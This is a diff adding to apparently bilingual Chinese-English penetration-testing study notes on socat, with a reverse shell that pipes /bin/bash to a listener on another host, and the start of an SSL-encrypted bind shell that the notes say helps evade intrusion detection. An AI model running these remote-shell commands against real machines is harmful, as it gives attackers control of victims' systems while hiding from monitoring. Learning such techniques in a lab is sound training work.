@@ -203,3 +203,32 @@ socat TCP:10.11.0.4:443 file:received_secret_passwords.txt,create
 > 成功連接，Bob 收到 Alice 的 /usr/share/wordlists/nmap.lst (received_secret_passwords.txt)
 
 ### - Socat Reverse Shells
+Bob will start a listener on port 443.
+```
+┌──(frankchang㉿CHW-Macbook)-[~]
+└─$ sudo socat -d -d TCP4-LISTEN:443 STDOUT
+2024/06/27 17:39:28 socat[71] N listening on AF=2 0.0.0.0:443
+
+```
+> -d -d：啟用兩級的調試訊息，會print 詳細的輸出，包括連接建立和data傳輸的訊息。
+
+Alice will use socat's exec option. It's similar to the **NETCAT -e**
+- Bob IP: 10.11.0.22
+```
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+```
+> EXEC:/bin/bash: 建立後執行 /bin/bash，將STDIN/STDOUT 重定向到該ip。
+
+ONCE CONNECTED, Bob can enter commands from his socat session, which will execute on Alice's machine.
+![image](https://hackmd.io/_uploads/Hy28O2q8R.png)
+> Bob 成功控制 Alice 電腦
+
+### – Socat Encrypted Bind Shells
+To add encryption to a bind shell, we'll rely on secure socket layer certificates.
+This level of encryption will assist in envading intrusion detection systems. And will help hide the sensitive data we are transceiving.
+We will use the openssl application, to create a self-signed certificate using the following options
+```
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+```
+> openssl 生成一個新的 RSA 私鑰和自簽憑證
+
